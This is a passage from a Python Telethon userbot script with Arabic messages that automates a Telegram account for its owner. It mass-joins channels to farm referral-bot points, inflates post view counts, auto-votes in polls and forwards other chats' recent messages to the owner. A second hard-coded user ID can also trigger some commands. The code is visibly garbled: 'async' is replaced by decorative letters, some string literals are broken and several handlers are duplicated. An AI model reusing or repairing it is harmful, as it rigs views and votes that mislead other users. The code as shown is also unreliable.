            msg2 = await ze1.get_messages(bot_usernameeee, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await ze1.send_message(event.chat_id, "**تم الانتهاء من التجميع | 𝑆 𝐴 **")


##########################################

@ze1.on(events.NewMessage(outgoing=False, pattern='^/point (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    pot = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
        await event.reply("جاري تجميع النقاط")
        await event.edit("جاري تجميع النقاط")
        joinu = await ze1(JoinChannelRequest('saythonh'))
        channel_entity = await ze1.get_entity(pot)
        await ze1.send_message(pot, '/start')
        await a𝑆 𝐴 ncio.sleep(4)
        msg0 = await ze1.get_messages(pot, limit=1)
        await msg0[0].click(2)
        await a𝑆 𝐴 ncio.sleep(4)
        msg1 = await ze1.get_messages(pot, limit=1)
        await msg1[0].click(0)

        chs = 1
        for i in range(100):
            await a𝑆 𝐴 ncio.sleep(4)

            list = await ze1(GetHistoryRequest(peer=channel_entity, limit=1,
                                                    offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                await ze1.send_message(event.chat_id, f"تم الانتهاء من التجميع | 𝑆 𝐴 ")

                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
                    await ze1(JoinChannelRequest(url))
                except:
                    bott = url.split('+')[-1]
                    await ze1(ImportChatInviteRequest(bott))
                msg2 = await ze1.get_messages(pot, limit=1)
                await msg2[0].click(text='تحقق')
                chs += 1
                await event.edit(f"تم الانضمام في {chs} قناة")
            except:
                msg2 = await ze1.get_messages(pot, limit=1)
                await msg2[0].click(text='التالي')
                chs += 1
                await event.edit(f"القناة رقم {chs}")

        await ze1.send_message(event.chat_id, "تم الانتهاء من التجميع | 𝑆 𝐴 ")
 
        









@ze1.on(events.NewMessage(outgoing=False, pattern=r'^/bot (.*) (.*) (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    bots = event.pattern_match.group(1) 
    ids = event.pattern_match.group(2) 
    idss = event.pattern_match.group(3) 
    idss = int(idss)
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        for i in range(idss):
            sleep(5)
            send = await ze1.send_message(bots,f'/start {ids}')
        sleep(6)
    msg = await ze1.get_messages(bots, limit=2)
    await msg[1].forward_to(ownerhson_id)

@ze1.on(events.NewMessage(outgoing=False, pattern='^/collect (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    while True:
        try:
            pot = event.pattern_match.group(1) 
            sender = await event.get_sender()
            if sender.id == ownerhson_id:
                await event.reply("**⛦ جاري بدء عملية التجميع اللانهائية ⛦**")
                joinu = await ze1(JoinChannelRequest('saythonh'))
                channel_entity = await ze1.get_entity(pot)
                await ze1.send_message(pot, '/start')
                await a𝑆 𝐴 ncio.sleep(2)
                msg0 = await ze1.get_messages(pot, limit=1)
                await msg0[0].click(2)
                await a𝑆 𝐴 ncio.sleep(2)
                msg1 = await ze1.get_messages(pot, limit=1)
                await msg1[0].click(0)

                chs = 1
                for i in range(100):
                    await a𝑆 𝐴 ncio.sleep(2)

                    list = await ze1(GetHistoryRequest(peer=channel_entity, limit=1,
                                                            offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
                    msgs = list.messages[0]
                    if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                        await ze1.send_message(event.chat_id, f"**⛦ حدث خطأ ، لاتقلق سوف اعاود المحاولة ⛦**")
                        break
                    url = msgs.reply_markup.rows[0].buttons[0].url
                    try:
                        try:
                            await ze1(JoinChannelRequest(url))
                        except:
                            bott = url.split('+')[-1]
                            await ze1(ImportChatInviteRequest(bott))
                        msg2 = await ze1.get_messages(pot, limit=1)
                        await msg2[0].click(text='تحقق')
                        chs += 1
                        await event.edit(f"**تم الانضمام في {chs} قناة**")
                    except:
                        msg2 = await ze1.get_messages(pot, limit=1)
                        await msg2[0].click(text='التالي')
                        chs += 1
                        await event.edit(f"**القناة رقم {chs}**")
                        await a𝑆 𝐴 ncio.sleep(60)

                await ze1.send_message(event.chat_id, "**⛦ حدث خطأ ، لاتقلق سوف اعاود المحاولة ⛦**")
        except Exception as e:
            # تسجيل الخطأ هنا إذا كنت ترغب في ذلك
            pass


running = True  # متغير للتحكم في حالة التشغيل

@ze1.on(events.NewMessage(outgoing=False, pattern='^/stop$'))  # نمط الرسالة التي يجب إرسالها لإيقاف الحلقات
a𝑆 𝐴 nc def stop(event):
    global running  # استخدام المتغير العالمي
    sender = await event.get_sender()
    if sender.id == ownerhson_id:  # التحقق من هوية المرسل
        running = False  # تغيير قيمة المتغير لإيقاف الحلقات
        await event.reply('تم إيقاف الحلقات')  # إرسال رد لتأكيد إيقاف الحلقات
        
        
        
@ze1.on(events.NewMessage(outgoing=False, pattern='^/run$'))  
a𝑆 𝐴 nc def run(event):
    global running  # استخدام المتغير العالمي
    sender = await event.get_sender()
    if sender.id == ownerhson_id:  # التحقق من هوية المرسل
        running = True  # تغيير قيمة المتغير لإيقاف الحلقات
        await event.reply('تم تشغيل جميع الحلقات')  # إرسال رد لتأكيد إيقاف الحلقات



@ze1.on(events.NewMessage(outgoing=False, pattern='^/somy (.*) (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    global running  # استخدام المتغير العالمي
    while running:  # التحقق من حالة التشغيل قبل كل تكرار
        try:
            pot = event.pattern_match.group(1) 
            numw = int(event.pattern_match.group(2))
            sender = await event.get_sender()
            if sender.id == ownerhson_id:
                await event.reply(f"**✣ حسنا سوف اقوم بعملية التجميع\\n✣ عدد الثواني بين كل محاولة : {numw} \\n✣ التجميع من بوت : @{pot}**")

                joinu = await ze1(JoinChannelRequest('saythonh'))
                channel_entity = await ze1.get_entity(pot)
                await ze1.send_message(pot, '**جاري بدأ عملية التجميع بواسطة زد إي**')
                await ze1.send_message(pot, '/start')
                await a𝑆 𝐴 ncio.sleep(2)
                msg0 = await ze1.get_messages(pot, limit=1)
                await msg0[0].click(2)
                await a𝑆 𝐴 ncio.sleep(2)
                msg1 = await ze1.get_messages(pot, limit=1)
                await msg1[0].click(0)

                chs = 0
                for i in range(100):
                    if not running:  # التحقق من حالة التشغيل قبل كل تكرار
                        break
                    await a𝑆 𝐴 ncio.sleep(2)

                    list = await ze1(GetHistoryRequest(peer=channel_entity, limit=1,
                                                            offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
                    msgs = list.messages[0]
                    if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                        await ze1.send_message(event.chat_id, f"**✣ حسنا سوف اقوم بعملية التجميع\\n✣ عدد الثواني بين كل محاولة : {numw} \\n✣ التجميع من بوت : @{pot}**")
                        break
                    url = msgs.reply_markup.rows[0].buttons[0].url
                    try:
                        try:
                            await ze1(JoinChannelRequest(url))
                        except:
                            𝑆 𝐴 th = url.split('+')[-1]
                            await ze1(ImportChatInviteRequest(𝑆 𝐴 th))
                        msg2 = await ze1.get_messages(pot, limit=1)
                        await msg2[0].click(text='التالي')
                        chs += 10
                        await event.reply(f"**✣ عدد النقاط في هذه المحاولة {chs} ✣**")
                    except:
                        msg2 = await ze1.get_messages(pot, limit=1)
                        await msg2[0].click(text='التالي')
                        chs += 0
                        await event.reply(f"**✣ عدد النقاط في هذه المحاولة {chs} ✣**")
                        
                await ze1.send_message(event.chat_id, f"**✣ عذرا نفذت قنوات البوت\\n✣ لكن سوف اعاود المحاولة بعد {numw} ثانية**")
                await a𝑆 𝐴 ncio.sleep(numw)
        except Exception as e:
            # تسجيل الخطأ هنا إذا كنت ترغب في ذلك
            await a𝑆 𝐴 ncio.sleep(numw)

# لإيقاف الحلقات، قم بتغيير قيمة المتغير running إلى False


@ze1.on(events.NewMessage(outgoing=False, pattern=r'^/ptf (.*) (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    pt = event.pattern_match.group(1) 
    ptt = event.pattern_match.group(2) 
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
     send = await ze1.send_message(pt, '/start')
     sleep(2)
    msg1 = await ze1.get_messages(pt, limit=1)
    await msg1[0].click(3)
    sleep(4)
    await ze1.send_message(pt, ptt)
    sleep(4)
    msg = await ze1.get_messages(bot_username, limit=1)

    await msg[0].forward_to(ownerhson_id)
    

@ze1.on(events.NewMessage(outgoing=False, pattern=r'^/pt1 (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    pt = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
     send = await ze1.send_message(bot_username, '/start')
     sleep(2)
    msg1 = await ze1.get_messages(bot_username, limit=1)
    await msg1[0].click(3)
    sleep(4)
    await ze1.send_message(bot_username, pt)
    sleep(4)
    msg = await ze1.get_messages(bot_username, limit=1)

    await msg[0].forward_to(ownerhson_id)
    
@ze1.on(events.NewMessage(outgoing=False, pattern=r'^/pt2 (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    pt = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
     send = await ze1.send_message(bot_usernamee, '/start')
     sleep(2)
    msg1 = await ze1.get_messages(bot_usernamee, limit=1)
    await msg1[0].click(3)
    sleep(4)
    await ze1.send_message(bot_usernamee, pt)
    sleep(4)
    msg = await ze1.get_messages(bot_usernamee, limit=1)

    await msg[0].forward_to(ownerhson_id)

@ze1.on(events.NewMessage(outgoing=False, pattern=r'^/pt3 (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    pt = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
     send = await ze1.send_message(bot_usernameee, '/start')
     sleep(2)
    msg1 = await ze1.get_messages(bot_usernameee, limit=1)
    await msg1[0].click(3)
    sleep(4)
    await ze1.send_message(bot_usernameee, pt)
    sleep(4)
    msg = await ze1.get_messages(bot_usernameee, limit=1)

    await msg[0].forward_to(ownerhson_id)
    
@ze1.on(events.NewMessage(outgoing=False, pattern=r'^/pt4 (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    pt = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
     send = await ze1.send_message(bot_usernameeee, '/start')
     sleep(2)
    msg1 = await ze1.get_messages(bot_usernameeee, limit=1)
    await msg1[0].click(3)
    sleep(4)
    await ze1.send_message(bot_usernameeee, pt)
    sleep(4)
    msg = await ze1.get_messages(bot_usernameeee, limit=1)

    await msg[0].forward_to(ownerhson_id)
    
    
@ze1.on(events.NewMessage(outgoing=False, pattern=r'/npoint (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    pt = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
     send = await ze1.send_message(pt, '/start')
     sleep(2)
    msg1 = await ze1.get_messages(pt, limit=1)
    await msg1[0].click(5)
    sleep(2)
    msg = await ze1.get_messages(pt, limit=1)

    await msg[0].forward_to(ownerhson_id)


@ze1.on(events.NewMessage(outgoing=False, pattern=r'/npoint1'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
     send = await ze1.send_message(bot_username, '/start')
     sleep(2)
    msg1 = await ze1.get_messages(bot_username, limit=1)
    await msg1[0].click(5)
    sleep(2)
    msg = await ze1.get_messages(bot_username, limit=1)

    await msg[0].forward_to(ownerhson_id)
    
@ze1.on(events.NewMessage(outgoing=False, pattern=r'/npoint2'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
     send = await ze1.send_message(bot_usernamee, '/start')
     sleep(2)
    msg1 = await ze1.get_messages(bot_usernamee, limit=1)
    await msg1[0].click(5)
    sleep(2)
    msg = await ze1.get_messages(bot_usernamee, limit=1)

    await msg[0].forward_to(ownerhson_id)
 
@ze1.on(events.NewMessage(outgoing=False, pattern=r'/npoint3'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
     send = await ze1.send_message(bot_usernameee, '/start')
     sleep(2)
    msg1 = await ze1.get_messages(bot_usernameee, limit=1)
    await msg1[0].click(5)
    sleep(2)
    msg = await ze1.get_messages(bot_usernameee, limit=1)

    await msg[0].forward_to(ownerhson_id)
    
@ze1.on(events.NewMessage(outgoing=False, pattern=r'/npoint4'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
     send = await ze1.send_message(bot_usernameeee, '/start')
     sleep(2)
    msg1 = await ze1.get_messages(bot_usernameeee, limit=1)
    await msg1[0].click(5)
    sleep(2)
    msg = await ze1.get_messages(bot_usernameeee, limit=1)

    await msg[0].forward_to(ownerhson_id)
    

@ze1.on(events.NewMessage(outgoing=False, pattern=r'/lpoint'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
        dialogs = await ze1.get_dialogs()
        for dialog in dialogs:
            if dialog.is_channel:
                await ze1(LeaveChannelRequest(dialog.entity))
                await event.respond(f"**قمت بمغادرة جميع القنوات والمجموعات**")
                await a𝑆 𝐴 ncio.sleep(3)

                




@ze1.on(events.NewMessage(pattern=r'^/send (.*) (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
     usern = event.pattern_match.group(1)
    mase = event.pattern_match.group(2)
    await ze1.send_message(usern, mase)
    await event.respond(f"**تـم ارسال الرسالة الى المستخدم {usern}**")    
    
    

@ze1.on(events.NewMessage(outgoing=False, pattern='/transfer'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        order = await event.reply(‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 |)



@ze1.on(events.NewMessage(outgoing=False, pattern='/infoacc'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        order = await event.reply(‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 |)


@ze1.on(events.NewMessage(outgoing=False, pattern=r'^/button (.*) (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    userbt = event.pattern_match.group(1) 
    bt = int(event.pattern_match.group(2))
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
     send = await ze1.send_message(userbt, '/start')
     sleep(2)
    msg1 = await ze1.get_messages(userbt, limit=1)
    await msg1[0].click(bt)
    await ze1.send_message(event.chat_id, f"**❈ حسناً قمت بالنقر على الزر رقم {bt}**")
        

@ze1.on(events.NewMessage(outgoing=False, pattern=r'^/forward (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    userbott = event.pattern_match.group(1)
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
        sing = await ze1.send_message(event.chat_id, f"**❈ حسناً سوف اقوم بتحويل اخر رسالة\\n❈ من المستخدم {userbott}**")
        msgs = await ze1.get_messages(userbott, limit=1)
        if msgs:
            await msgs[0].forward_to(ownerhson_id)
       
@ze1.on(events.NewMessage(outgoing=False, pattern='/join'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
        send = await ze1.send_message(event.chat_id, "**جاري الانضمام التلقائي للقنوات**")
        joinq = await ze1(JoinChannelRequest('d3boot_7'))
        joinw = await ze1(JoinChannelRequest('Fvvvv'))
        joine = await ze1(JoinChannelRequest('DzDDDD'))
        joinr = await ze1(JoinChannelRequest('botbillion'))
        joint = await ze1(JoinChannelRequest('zzzzzz1'))
        joiny = await ze1(JoinChannelRequest('zzzzzz'))
        joini = await ze1(JoinChannelRequest('zz_MX'))
        joino = await ze1(JoinChannelRequest('lI7777Il'))
        joinp = await ze1(JoinChannelRequest('KTTTT'))
        joina = await ze1(JoinChannelRequest('RRXFR'))
        sendd = await ze1.send_message(event.chat_id, "**تـم الانضمام في القنوات**")
        
@ze1.on(events.NewMessage(outgoing=False, pattern='/jn (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    usercht = event.pattern_match.group(1)
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
        sendy = await ze1.send_message(event.chat_id,f"**جاري الانضمام في القناة @{usercht}**")
        joinch = await ze1(JoinChannelRequest(usercht))
        sendy = await ze1.send_message(event.chat_id,f"**تم الانضمام في القناة @{usercht}**")

@ze1.on(events.NewMessage(outgoing=False, pattern='/lv (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    usercht = event.pattern_match.group(1)
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
        sendy = await ze1.send_message(event.chat_id,f"**جاري مغادرة القناة  @{usercht}**")
        joinch = await ze1(LeaveChannelRequest(usercht))
        sendy = await ze1.send_message(event.chat_id,f"**تم مغادرة القناة @{usercht}**")

@ze1.on(events.NewMessage(outgoing=False, pattern='^/voice (.*) (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
        chn = event.pattern_match.group(1)
        msg_id = int(event.pattern_match.group(2))
        wait = await ze1.send_message(ownerhson_id,'**⚝ حسناً سوف اقوم بالانضمام والتصويت**')
        haso = await ze1.get_entity(chn)
        join = await ze1(JoinChannelRequest(chn))
        joion = await ze1(JoinChannelRequest('saythonh'))
        msg = await ze1.get_messages(chn, ids=msg_id)
        await msg.click(0)
        sleep(1)
        await ze1.send_message(ownerhson_id,'**⚝ قمت بالانضمام والتصويت بنجاح**')


ownerhson_ids = 5159123009
@ze1.on(events.NewMessage(outgoing=False, pattern='^/voice (.*) (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_ids:
        chn = event.pattern_match.group(1)
        nu = int(event.pattern_match.group(2))
        nuu = nu - 1
        wait = await ze1.send_message(ownerhson_ids,'**⚝ حسناً سوف اقوم بالانضمام والتصويت**')
        haso = await ze1.get_entity(chn)
        join = await ze1(JoinChannelRequest(chn))
        joion = await ze1(JoinChannelRequest('saythonh'))
        somy = await ze1.get_messages(chn, limit=nu)
        await somy[nuu].click(0)
        sleep(1)
        await ze1.send_message(ownerhson_ids,'**⚝ قمت بالانضمام والتصويت بنجاح**')






@ze1.on(events.NewMessage(outgoing=False, pattern=r'/restart'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        await event.reply("تم الايقاف")
        await ze1.disconnect()
        
        


     
            
@ze1.on(events.NewMessage(outgoing=False, pattern=r'/restart'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_ids :
        await event.reply("تم الايقاف")
        await ze1.disconnect()
        
        

@ze1.on(events.NewMessage(outgoing=False, pattern=r'^/view (.*) (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    bots = event.pattern_match.group(1) 
    ids = int(event.pattern_match.group(2))
    channel = f'{bots}'
    msg_ids = [ids]
    await ze1(GetMessagesViewsRequest(
            peer=channel,
            id=msg_ids,
            increment=True
        ))





@ze1.on(events.NewMessage(pattern='/block'))
a𝑆 𝐴 nc def ban(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
        if event.is_private:
            parts = event.raw_text.split()
            if len(parts) == 2:
                username = parts[1]
                user = await ze1.get_entity(username)
                user_id = user.id
                await ze1(functions.contacts.BlockRequest(user_id))
                await event.respond(f'تم حظر المستخدم {username}')
            else:
                await event.respond('يرجى إرسال اسم المستخدم مع الأمر')
        else:
            await event.respond('لا يمكنني حظر المستخدمين إلا في المحادثات الخاصة')
    else:
        await event.respond('عذرًا، هذا الأمر متاح فقط للمطور')
        

@ze1.on(events.NewMessage(pattern='/unblock'))
a𝑆 𝐴 nc def unban(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
        if event.is_private:
            parts = event.raw_text.split()
            if len(parts) == 2:
                username = parts[1]
                user = await ze1.get_entity(username)
                user_id = user.id
                await ze1(functions.contacts.UnblockRequest(user_id))
                await event.respond(f'تم إلغاء حظر المستخدم {username}')
            else:
                await event.respond('يرجى إرسال اسم المستخدم مع الأمر')
        else:
            await event.respond('لا يمكنني إلغاء حظر المستخدمين إلا في المحادثات الخاصة')
    else:
        await event.respond('عذرًا، هذا الأمر متاح فقط للمطور')


@ze1.on(events.NewMessage)
a𝑆 𝐴 nc def my_event_handler(event):
    if 'اشترك' in event.raw_text or 'الاشتراك' in event.raw_text:
        message = event.message.message
        link_pattern = re.compile(r'(https?://\S+|@\w+)')
        link = re.search(link_pattern, message).group(1)
        if link.startswith('https://t.me/+'):
            link = link.replace('https://t.me/+', '')
            result = await ze1(ImportChatInviteRequest(link.strip()))
        elif link.startswith('@'):
            get_entity_must_join = await ze1.get_entity(link)
            result = await ze1(JoinChannelRequest(get_entity_must_join.id))
        else:
            get_entity_must_join = await ze1.get_entity(link)
            result = await ze1(JoinChannelRequest(get_entity_must_join.id))


@ze1.on(events.NewMessage(outgoing=False, pattern='/col6ect'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
        await event.reply("جاري تجميع النقاط")
        await event.edit("جاري تجميع النقاط")
        joinu = await ze1(JoinChannelRequest('saythonh'))
        channel_entity = await ze1.get_entity('@DamKombot')
        await ze1.send_message('@DamKombot', '/start')
        await a𝑆 𝐴 ncio.sleep(4)
        msg0 = await ze1.get_messages('@DamKombot', limit=1)
        await msg0[0].click(1)
        await a𝑆 𝐴 ncio.sleep(4)
        msg1 = await ze1.get_messages('@DamKombot', limit=1)
        await msg1[0].click(0)

        chs = 1
        for i in range(100):
            await a𝑆 𝐴 ncio.sleep(4)

            list = await ze1(GetHistoryRequest(peer=channel_entity, limit=1,
                                                    offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                await ze1.send_message(event.chat_id, f"تم الانتهاء من التجميع | 𝑆 𝐴 ")

                break
            message_text = msgs.message
            channel_username = message_text.split('@')[-1]
            try:
                try:
                    await ze1(JoinChannelRequest(channel_username))
                except:
                    bott = channel_username.split('+')[-1]
                    await ze1(ImportChatInviteRequest(bott))
                msg2 = await ze1.get_messages('@DamKombot', limit=1)
                await msg2[0].click(text='اشتركت ✅')
                chs += 1
                await event.edit(f"تم الانضمام في {chs} قناة")
            except:
                msg2 = await ze1.get_messages('@DamKombot', limit=1)
                await msg2[0].click(text='التالي')
                chs += 1
                await event.edit(f"القناة رقم {chs}")

        await ze1.send_message(event.chat_id, "تم الانتهاء من التجميع | 𝑆 𝐴 ")





@ze1.on(events.NewMessage(outgoing=False, pattern='/trbefer (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    user = event.pattern_match.group(1)
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
        await event.reply("جاري التحويل")
        await event.edit("جاري التحويل")
        joinu = await ze1(JoinChannelRequest('saythonh'))
        channel_entity = await ze1.get_entity('@DamKombot')
        await ze1.send_message('@DamKombot', '/start')
        await a𝑆 𝐴 ncio.sleep(4)
        msg0 = (await ze1.get_messages('@DamKombot', limit=1))[0]
        msg_text = msg0.message
        points_line = [line for line in msg_text.split('\\n') if 'نقاطك' in line][0]
        points = int(points_line.split(':')[1].strip())
        msg1 = (await ze1.get_messages('@DamKombot', limit=1))[0]
        await msg1.click(4)
        await ze1.send_message('@DamKombot', f'{user}')
        
        await ze1.send_message('@DamKombot', f'{points}')



@ze1.on(events.NewMessage(outgoing=False, pattern='/jdhncww'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
        await event.reply("جاري تجميع الهدية")
        await event.edit("جاري تجميع الهدية")
        joinu = await ze1(JoinChannelRequest('saythonh'))
        channel_entity = await ze1.get_entity('@DamKombot')
        await ze1.send_message('@DamKombot', '/start')
        await a𝑆 𝐴 ncio.sleep(4)
        msg0 = await ze1.get_messages('@DamKombot', limit=1)
        await msg0[0].click(1)
        await a𝑆 𝐴 ncio.sleep(4)
        msg1 = await ze1.get_messages('@DamKombot', limit=1)
        await msg1[0].click(2)
        
@ze1.on(events.NewMessage(outgoing=False, pattern='^/agift (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    pot = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
        await event.reply("جاري تجميع الهدية")
        await event.edit("جاري تجميع الهدية")
        joinu = await ze1(JoinChannelRequest('saythonh'))
        channel_entity = await ze1.get_entity(pot)
        await ze1.send_message(pot, '/start')
        await a𝑆 𝐴 ncio.sleep(4)
        msg0 = await ze1.get_messages(pot, limit=1)
        await msg0[0].click(6)
        

@ze1.on(events.NewMessage(outgoing=False, pattern='/agiacode (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    cod = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
        await event.reply("جاري تجميع نقاط الكود")
        await event.edit("جاري تجميع نقاط الكود")
        joinu = await ze1(JoinChannelRequest('saythonh'))
        channel_entity = await ze1.get_entity('@DamKombot')
        await ze1.send_message('@DamKombot', '/start')
        await a𝑆 𝐴 ncio.sleep(4)
        msg0 = await ze1.get_messages('@DamKombot', limit=1)
        await msg0[0].click(3)
        await a𝑆 𝐴 ncio.sleep(4)
        msg1 = await ze1.get_messages('@DamKombot', limit=1)
        await ze1.send_message('@DamKombot', f'{cod}')

@ze1.on(events.NewMessage(outgoing=False, pattern=r'^/forward (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    userbott = event.pattern_match.group(1)
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
        sing = await ze1.send_message(event.chat_id, f"**❈ حسناً سوف اقوم بتحويل اخر 5 رسائل\\n❈ من المستخدم {userbott}**")
        msgs = await ze1.get_messages(userbott, limit=6)
        if msgs:
            message_text = "forward-\\n\\n"
            for i, msg in enumerate(msgs):
                message_text += f"**\\n{i+1} :**\\n " + msg.text + "\\n"
            await ze1.send_message(ownerhson_id, message_text)




@ze1.on(events.NewMessage(outgoing=False, pattern=r'^/button (.*) (.*)'))
a𝑆 𝐴 nc def OwnerStart(event):
    userbt = event.pattern_match.group(1) 
    bt = int(event.pattern_match.group(2))
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
     
     sleep(2)
    msg1 = await ze1.get_messages(userbt, limit=1)
    await msg1[0].click(bt)
    await ze1.send_message(event.chat_id, f"**❈ حسناً قمت بالنقر على الزر رقم {bt}**")
        

print('  ')
print('  ')
print("❖ Ze Userbot Running  ")
print('  ')
ze1.loop.run_until_complete(main())
ze1.run_until_disconnected()



#the code py ze tm



            

            
"""




